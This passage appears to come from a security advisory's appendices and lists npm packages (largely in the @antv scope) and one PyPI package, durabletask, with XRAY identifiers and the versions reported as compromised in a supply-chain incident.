| @antv/g-canvas | XRAY-986091 | 2.4.0,2.3.0 |
| @antv/g-canvaskit | XRAY-986103 | 1.2.1,1.3.1 |
| @antv/g-compat | XRAY-986189 | 1.1.11,1.2.11 |
| @antv/g-components | XRAY-986384 | 2.1.42,2.2.42 |
| @antv/g-css-layout-api | XRAY-986079 | 1.1.38,1.2.38 |
| @antv/g-css-typed-om-api | XRAY-986281 | 1.1.38,1.2.38 |
| @antv/g-device-api | XRAY-986149 | 1.7.13,1.8.13 |
| @antv/g-dom-mutation-observer-api | XRAY-986284 | 2.1.42,2.2.42 |
| @antv/g-gesture | XRAY-986322 | 3.2.42,3.1.42 |
| @antv/g-image-exporter | XRAY-986308 | 1.2.42,1.1.42 |
| @antv/g-layout-blocklike | XRAY-986133 | 1.9.49,1.8.49 |
| @antv/g-lite | XRAY-986251 | 2.8.0,2.9.0 |
| @antv/g-lottie-player | XRAY-986185 | 1.2.1,1.3.1 |
| @antv/g-math | XRAY-986223 | 3.3.0,3.2.0 |
| @antv/g-mobile | XRAY-986316 | 1.3.5,1.2.5 |
| @antv/g-mobile-canvas | XRAY-986186 | 1.3.1,1.2.1 |
| @antv/g-mobile-canvas-element | XRAY-986141 | 1.2.42,1.1.42 |
| @antv/g-mobile-svg | XRAY-986258 | 1.3.1,1.2.1 |
| @antv/g-mobile-webgl | XRAY-986151 | 1.2.1,1.3.1 |
| @antv/g-pattern | XRAY-986172 | 2.1.42,2.2.42 |
| @antv/g-perf | XRAY-986349 | 1.1.0,1.2.0 |
| @antv/g-plugin-3d | XRAY-986300 | 2.2.1,2.3.1 |
| @antv/g-plugin-a11y | XRAY-986128 | 1.5.1,1.6.1 |
| @antv/g-plugin-annotation | XRAY-986074 | 1.3.0,1.4.0 |
| @antv/g-plugin-box2d | XRAY-986271 | 2.3.1,2.2.1 |
| @antv/g-plugin-canvas-path-generator | XRAY-986217 | 2.2.26,2.3.26 |
| @antv/g-plugin-canvas-picker | XRAY-986119 | 2.4.1,2.5.1 |
| @antv/g-plugin-canvas-renderer | XRAY-986122 | 2.6.1,2.7.1 |
| @antv/g-plugin-canvaskit-renderer | XRAY-986083 | 2.4.1,2.5.1 |
| @antv/g-plugin-control | XRAY-986337 | 2.2.1,2.3.1 |
| @antv/g-plugin-css-select | XRAY-986190 | 2.2.1,2.3.1 |
| @antv/g-plugin-device-renderer | XRAY-986198 | 2.7.1,2.8.1 |
| @antv/g-plugin-dom-interaction | XRAY-986342 | 2.2.31,2.3.31 |
| @antv/g-plugin-dragndrop | XRAY-986233 | 2.2.1,2.3.1 |
| @antv/g-plugin-gesture | XRAY-986124 | 2.2.1,2.3.1 |
| @antv/g-plugin-gpgpu | XRAY-986143 | 1.10.20,1.11.20 |
| @antv/g-plugin-html-renderer | XRAY-986184 | 2.4.1,2.5.1 |
| @antv/g-plugin-image-loader | XRAY-986173 | 2.4.1,2.5.1 |
| @antv/g-plugin-matterjs | XRAY-986250 | 2.2.1,2.3.1 |
| @antv/g-plugin-mobile-interaction | XRAY-986297 | 1.1.42,1.2.42 |
| @antv/g-plugin-physx | XRAY-986311 | 2.3.1,2.2.1 |
| @antv/g-plugin-rough-canvas-renderer | XRAY-986242 | 2.2.1,2.3.1 |
| @antv/g-plugin-rough-svg-renderer | XRAY-986370 | 2.2.1,2.3.1 |
| @antv/g-plugin-svg-picker | XRAY-986197 | 2.2.46,2.1.46 |
| @antv/g-plugin-svg-renderer | XRAY-986252 | 2.5.1,2.6.1 |
| @antv/g-plugin-webgl-device | XRAY-986132 | 1.10.17,1.11.17 |
| @antv/g-plugin-webgl-renderer | XRAY-986077 | 1.1.26,1.2.26 |
| @antv/g-plugin-webgpu-device | XRAY-986087 | 1.10.17,1.11.17 |
| @antv/g-plugin-yoga | XRAY-986245 | 2.4.1,2.5.1 |
| @antv/g-plugin-zdog-canvas-renderer | XRAY-986373 | 2.2.1,2.3.1 |
| @antv/g-plugin-zdog-svg-renderer | XRAY-986285 | 2.2.1,2.3.1 |
| @antv/g-shader-components | XRAY-986076 | 2.2.0,2.1.0 |
| @antv/g-svg | XRAY-986080 | 2.3.1,2.2.1 |
| @antv/g-web-animations-api | XRAY-986265 | 2.2.32,2.3.32 |
| @antv/g-web-components | XRAY-986313 | 2.3.1,2.2.1 |
| @antv/g-webgl | XRAY-986203 | 2.3.1,2.2.1 |
| @antv/g-webgl-compute | XRAY-986267 | 0.2.1,0.1.1 |
| @antv/g-webgpu | XRAY-986102 | 2.3.1,2.2.1 |
| @antv/g-webgpu-compiler | XRAY-986335 | 0.8.2,0.9.2 |
| @antv/g-webgpu-core | XRAY-986224 | 0.8.2,0.9.2 |
| @antv/g-webgpu-engine | XRAY-986232 | 0.9.2,0.8.2 |
| @antv/g-webgpu-raytracer | XRAY-986120 | 0.7.1,0.6.1 |
| @antv/g-webgpu-unitchart | XRAY-986228 | 0.7.1,0.6.1 |
| @antv/g2 | XRAY-986206 | 5.5.8,5.6.8 |
| @antv/g2-brush | XRAY-986174 | 0.1.2,0.2.2 |
| @antv/g2-extension-3d | XRAY-986084 | 0.3.0,0.4.0 |
| @antv/g2-extension-ava | XRAY-986155 | 0.3.0,0.4.0 |
| @antv/g2-extension-plot | XRAY-986304 | 0.4.2,0.3.2 |
| @antv/g2-plugin-slider | XRAY-986179 | 2.3.1,2.2.1 |
| @antv/g2-ssr | XRAY-986390 | 0.3.0,0.4.0 |
| @antv/g2plot | XRAY-986168 | 2.5.35,2.6.35 |
| @antv/g2plot-schemas | XRAY-986259 | 1.3.2,1.4.2 |
| @antv/g6 | XRAY-986357 | 5.3.1,5.2.1 |
| @antv/g6-alipay | XRAY-986162 | 0.2.1,0.1.1 |
| @antv/g6-cli | XRAY-986315 | 0.2.4,0.1.4 |
| @antv/g6-core | XRAY-986274 | 0.9.24,0.10.24 |
| @antv/g6-editor | XRAY-986305 | 1.3.0,1.4.0 |
| @antv/g6-element | XRAY-986385 | 0.10.25,0.9.25 |
| @antv/g6-extension-3d | XRAY-986134 | 0.2.23,0.3.23 |
| @antv/g6-extension-react | XRAY-986215 | 0.3.7,0.4.7 |
| @antv/g6-mobile | XRAY-986118 | 0.2.2,0.3.2 |
| @antv/g6-pc | XRAY-986264 | 0.9.25,0.10.25 |
| @antv/g6-plugin | XRAY-986369 | 0.10.25,0.9.25 |
| @antv/g6-plugin-map-view | XRAY-986147 | 0.2.4,0.1.4 |
| @antv/g6-plugins | XRAY-986280 | 1.2.9,1.1.9 |
| @antv/g6-react-node | XRAY-986171 | 1.6.8,1.5.8 |
| @antv/g6-ssr | XRAY-986107 | 0.3.1,0.2.1 |
| @antv/g6-wx | XRAY-986368 | 0.2.1,0.1.1 |
| @antv/gatsby-theme | XRAY-986140 | 0.3.0,0.2.0 |
| @antv/geo-coord | XRAY-986309 | 1.2.8,1.1.8 |
| @antv/gi-assets-advance | XRAY-986098 | 2.6.22,2.7.22 |
| @antv/gi-assets-algorithm | XRAY-986163 | 2.5.19,2.4.19 |
| @antv/gi-assets-basic | XRAY-986234 | 2.5.40,2.6.40 |
| @antv/gi-assets-galaxybase | XRAY-986097 | 1.4.15,1.3.15 |
| @antv/gi-assets-graphscope | XRAY-986277 | 2.3.15,2.2.15 |
| @antv/gi-assets-hugegraph | XRAY-986104 | 1.3.15,1.2.15 |
| @antv/gi-assets-janusgraph | XRAY-986387 | 1.2.15,1.3.15 |
| @antv/gi-assets-neo4j | XRAY-986260 | 2.3.15,2.2.15 |
| @antv/gi-assets-scene | XRAY-986254 | 2.3.21,2.4.21 |
| @antv/gi-assets-tugraph | XRAY-986380 | 2.3.15,2.2.15 |
| @antv/gi-assets-tugraph-analytics | XRAY-986207 | 0.3.15,0.4.15 |
| @antv/gi-assets-xlab | XRAY-986263 | 0.2.30,0.3.30 |
| @antv/gi-cli | XRAY-986296 | 1.4.11,1.3.11 |
| @antv/gi-common-components | XRAY-986247 | 1.4.16,1.5.16 |
| @antv/gi-mock-data | XRAY-986170 | 1.2.5,1.1.5 |
| @antv/gi-public-data | XRAY-986287 | 1.1.1,1.2.1 |
| @antv/gi-sdk | XRAY-986150 | 3.2.0,3.1.0 |
| @antv/gi-sdk-app | XRAY-986317 | 1.4.10,1.3.10 |
| @antv/gi-theme-antd | XRAY-986312 | 0.7.11,0.8.11 |
| @antv/github-config-cli | XRAY-986290 | 0.3.0,0.2.0 |
| @antv/gl-matrix | XRAY-986192 | 2.8.1,2.9.1 |
| @antv/gpt-vis | XRAY-986156 | 1.2.0,1.1.0 |
| @antv/gpt-vis-ssr | XRAY-986148 | 0.5.7,0.4.7 |
| @antv/graphin | XRAY-986273 | 3.1.5,3.2.5 |
| @antv/graphin-components | XRAY-986219 | 2.5.1,2.6.1 |
| @antv/graphin-graphscope | XRAY-986340 | 1.1.5,1.2.5 |
| @antv/graphin-icons | XRAY-986294 | 1.1.0,1.2.0 |
| @antv/graphlib | XRAY-986327 | 2.2.4,2.1.4 |
| @antv/hierarchy | XRAY-986382 | 0.8.1,0.9.1 |
| @antv/infographic | XRAY-986195 | 0.3.19,0.4.19 |
| @antv/insight-component | XRAY-986099 | 1.1.0,1.2.0 |
| @antv/interaction | XRAY-986354 | 0.3.5,0.2.5 |
| @antv/istanbul | XRAY-986367 | 0.2.0,0.1.0 |
| @antv/knowledge | XRAY-986328 | 1.2.4,1.3.4 |
| @antv/l7 | XRAY-986211 | 2.27.10,2.26.10 |
| @antv/l7-component | XRAY-986361 | 2.26.10,2.27.10 |
| @antv/l7-composite-layers | XRAY-986176 | 0.18.1,0.19.1 |
| @antv/l7-core | XRAY-986310 | 2.26.10,2.27.10 |
| @antv/l7-district | XRAY-986183 | 2.4.12,2.5.12 |
| @antv/l7-draw | XRAY-986152 | 3.2.5,3.3.5 |
| @antv/l7-editor | XRAY-986386 | 1.2.13,1.3.13 |
| @antv/l7-extension-g-layer | XRAY-986261 | 1.1.0,1.2.0 |
| @antv/l7-layers | XRAY-986169 | 2.26.10,2.27.10 |
| @antv/l7-leaflet | XRAY-986182 | 1.2.2,1.1.2 |
| @antv/l7-map | XRAY-986255 | 2.27.10,2.26.10 |
| @antv/l7-mapkit | XRAY-986081 | 0.7.0,0.6.0 |
| @antv/l7-maps | XRAY-986138 | 2.26.10,2.27.10 |
| @antv/l7-mini | XRAY-986146 | 2.21.8,2.22.8 |
| @antv/l7-pass | XRAY-986177 | 1.2.0,1.1.0 |
| @antv/l7-react | XRAY-986239 | 2.6.3,2.5.3 |
| @antv/l7-renderer | XRAY-986363 | 2.26.10,2.27.10 |
| @antv/l7-scene | XRAY-986089 | 2.27.10,2.26.10 |
| @antv/l7-source | XRAY-986347 | 2.26.10,2.27.10 |
| @antv/l7-three | XRAY-986334 | 2.26.10,2.27.10 |
| @antv/l7-utils | XRAY-986123 | 2.27.10,2.26.10 |
| @antv/l7plot | XRAY-986331 | 0.6.11,0.7.11 |
| @antv/l7plot-component | XRAY-986320 | 0.2.11,0.1.11 |
| @antv/larkmap | XRAY-986212 | 1.6.1,1.7.1 |
| @antv/layout-gpu | XRAY-986351 | 1.2.7,1.3.7 |
| @antv/layout-wasm | XRAY-986194 | 1.5.2,1.6.2 |
| @antv/li-aiearth-assets | XRAY-986279 | 0.6.7,0.5.7 |
| @antv/li-analysis-assets | XRAY-986139 | 1.11.1,1.10.1 |
| @antv/li-core-assets | XRAY-986365 | 1.5.7,1.4.7 |
| @antv/li-editor | XRAY-986383 | 1.8.1,1.7.1 |
| @antv/li-p2 | XRAY-986391 | 1.10.2,1.9.2 |
| @antv/li-sam-assets | XRAY-986070 | 0.2.4,0.3.4 |
| @antv/li-sdk | XRAY-986088 | 1.6.1,1.7.1 |
| @antv/lite-insight | XRAY-986135 | 2.2.1,2.3.1 |
| @antv/matrix-util | XRAY-986344 | 3.1.4,3.2.4 |
| @antv/mcp-server-antv | XRAY-986272 | 0.2.8,0.3.8 |
| @antv/mcp-server-chart | XRAY-986191 | 0.10.10,0.11.10 |
| @antv/my-f2 | XRAY-986213 | 2.2.7,2.3.7 |
| @antv/my-f2-pc | XRAY-986345 | 0.2.1,0.3.1 |
| @antv/narrative-text-editor | XRAY-986227 | 0.3.20,0.4.20 |
| @antv/narrative-text-schema | XRAY-986241 | 0.4.7,0.5.7 |
| @antv/narrative-text-vis | XRAY-986243 | 0.4.16,0.5.16 |
| @antv/path-util | XRAY-986222 | 3.1.1,3.2.1 |
| @antv/react-g | XRAY-986302 | 2.2.1,2.3.1 |
| @antv/s2 | XRAY-986333 | 2.9.1,2.8.1 |
| @antv/s2-react | XRAY-986330 | 2.4.1,2.5.1 |
| @antv/s2-react-components | XRAY-986348 | 2.2.2,2.3.2 |
| @antv/s2-ssr | XRAY-986372 | 0.3.1,0.2.1 |
| @antv/s2-vue | XRAY-986072 | 2.4.0,2.3.0 |
| @antv/sam | XRAY-986086 | 0.3.0,0.4.0 |
| @antv/scale | XRAY-986318 | 0.6.2,0.7.2 |
| @antv/semantic-release-pnpm | XRAY-986299 | 1.1.4,1.2.4 |
| @antv/smart-color | XRAY-986275 | 0.3.1,0.4.1 |
| @antv/stat | XRAY-986092 | 0.1.2,0.2.2 |
| @antv/t8 | XRAY-986288 | 0.4.0,0.5.0 |
| @antv/thumbnails | XRAY-986210 | 2.1.0,2.2.0 |
| @antv/thumbnails-component | XRAY-986262 | 2.1.0,2.2.0 |
| @antv/torch | XRAY-986257 | 1.1.6,1.2.6 |
| @antv/translator | XRAY-986073 | 1.2.1,1.1.1 |
| @antv/util | XRAY-986248 | 3.5.11,3.4.11 |
| @antv/vendor | XRAY-986244 | 1.1.11,1.2.11 |
| @antv/vis-predict-engine | XRAY-986188 | 0.2.1,0.3.1 |
| @antv/webgpu-graph | XRAY-986270 | 1.2.0,1.1.0 |
| @antv/word-scale-chart | XRAY-986175 | 0.4.4,0.5.4 |
| @antv/wx-f2 | XRAY-986218 | 2.2.1,2.3.1 |
| @antv/x6 | XRAY-986154 | 3.2.7,3.3.7 |
| @antv/x6-angular-shape | XRAY-986306 | 3.2.1,3.1.1 |
| @antv/x6-common | XRAY-986105 | 2.1.17,2.2.17 |
| @antv/x6-components | XRAY-986137 | 0.12.7,0.11.7 |
| @antv/x6-geometry | XRAY-986291 | 2.1.5,2.2.5 |
| @antv/x6-plugin-clipboard | XRAY-986253 | 2.2.6,2.3.6 |
| @antv/x6-plugin-dnd | XRAY-986115 | 2.2.1,2.3.1 |
| @antv/x6-plugin-export | XRAY-986216 | 2.2.6,2.3.6 |
| @antv/x6-plugin-history | XRAY-986069 | 2.3.4,2.4.4 |
| @antv/x6-plugin-keyboard | XRAY-986286 | 2.3.3,2.4.3 |
| @antv/x6-plugin-minimap | XRAY-986355 | 2.1.7,2.2.7 |
| @antv/x6-plugin-scroller | XRAY-986221 | 2.2.10,2.1.10 |
| @antv/x6-plugin-selection | XRAY-986235 | 2.3.2,2.4.2 |
| @antv/x6-plugin-snapline | XRAY-986208 | 2.2.7,2.3.7 |
| @antv/x6-plugin-stencil | XRAY-986205 | 2.3.5,2.2.5 |
| @antv/x6-plugin-transform | XRAY-986130 | 2.2.8,2.3.8 |
| @antv/x6-react | XRAY-986246 | 0.3.26,0.2.26 |
| @antv/x6-react-components | XRAY-986180 | 2.1.9,2.2.9 |
| @antv/x6-react-shape | XRAY-986204 | 3.1.1,3.2.1 |
| @antv/x6-vector | XRAY-986238 | 1.5.2,1.6.2 |
| @antv/x6-vue-shape | XRAY-986350 | 3.1.2,3.2.2 |
| @antv/x6-vue3-shape | XRAY-986353 | 1.2.0,1.1.0 |
| @antv/xflow | XRAY-986336 | 2.2.13,2.3.13 |
| @antv/xflow-core | XRAY-986090 | 1.1.55,1.2.55 |
| @antv/xflow-diff | XRAY-986117 | 1.2.0,1.1.0 |
| @antv/xflow-extension | XRAY-986375 | 1.2.55,1.1.55 |
| @antv/xflow-hook | XRAY-986231 | 1.2.55,1.1.55 |
| @lint-md/cli | XRAY-986199 | 2.2.0,2.1.0 |
| @lint-md/core | XRAY-986378 | 2.2.0,2.1.0 |
| @lint-md/parser | XRAY-986321 | 0.1.14,0.2.14 |
| @openclaw-cn/cli | XRAY-986388 | 1.4.1 |
| @openclaw-cn/feishu | XRAY-986181 | 0.2.11 |
| @openclaw-cn/libsignal | XRAY-986145 | 2.1.1 |
| @openclaw-cn/toutiao-ops | XRAY-986095 | 1.2.4 |
| @starmind/collector-cli | XRAY-986256 | 0.3.10 |
| ai-figure | XRAY-986364 | 0.6.0,0.5.0 |
| amapcn | XRAY-986389 | 0.2.2,0.3.2 |
| ast-plugin | XRAY-986157 | 0.2.7,0.1.7 |
| babel-plugin-version | XRAY-986269 | 0.3.3,0.4.3 |
| boring-avatars-vanilla | XRAY-986230 | 1.2.2,1.1.2 |
| byte-parser | XRAY-986356 | 1.2.0,1.1.0 |
| canvas-nest.js | XRAY-986196 | 2.1.4,2.2.4 |
| echarts-for-react | XRAY-986096 | 3.2.7,3.1.7 |
| filesize.js | XRAY-986307 | 2.1.0,2.2.0 |
| fixed-round | XRAY-986093 | 1.2.2,1.1.2 |
| gantt-for-react | XRAY-986374 | 0.4.0,0.3.0 |
| jest-canvas-mock | XRAY-986108 | 2.7.3,2.6.3 |
| jest-date-mock | XRAY-986200 | 1.1.11,1.2.11 |
| jest-electron | XRAY-986240 | 0.2.12,0.3.12 |
| jest-expect | XRAY-986346 | 0.1.1,0.2.1 |
| jest-less-loader | XRAY-986178 | 0.3.0,0.4.0 |
| jest-random-mock | XRAY-986109 | 1.1.0,1.2.0 |
| jest-url-loader | XRAY-986220 | 0.2.0,0.3.0 |
| limit-size | XRAY-986127 | 0.2.4,0.3.4 |
| lint-md | XRAY-986226 | 0.3.0,0.4.0 |
| lint-md-cli | XRAY-986236 | 0.3.2,0.2.2 |
| mcp-echarts | XRAY-986379 | 0.9.1,0.8.1 |
| mcp-mermaid | XRAY-986106 | 0.5.1,0.6.1 |
| miz | XRAY-986360 | 1.2.1,1.1.1 |
| onfire.js | XRAY-986338 | 2.1.1,2.2.1 |
| openclaw-cn | XRAY-986332 | 0.3.0 |
| react-adsense | XRAY-986121 | 0.3.0,0.2.0 |
| relationship.js | XRAY-986278 | 1.4.9,1.3.9 |
| ribbon.js | XRAY-986116 | 1.1.2 |
| size-sensor | XRAY-986298 | 1.1.4,1.2.4 |
| slice.js | XRAY-986101 | 1.2.1,1.3.1 |
| timeago-react | XRAY-986229 | 3.1.7,3.2.7 |
| timeago.js | XRAY-986094 | 4.1.2,4.2.2 |
| uri-parse | XRAY-986324 | 1.1.0,1.2.0 |
| word-width | XRAY-986085 | 1.1.1,1.2.1 |
| xmorse | XRAY-986131 | 1.1.0,1.2.0 |
| @cap-js/openapi | XRAY-986402 | 1.4.1 |

## Appendix B: PyPI Compromised Package Versions

| Package Name | XrayID | Versions |
| :---- | :---- |
| durabletask | XRAY-986583 | 1.4.1,1.4.2,1.4.3 |
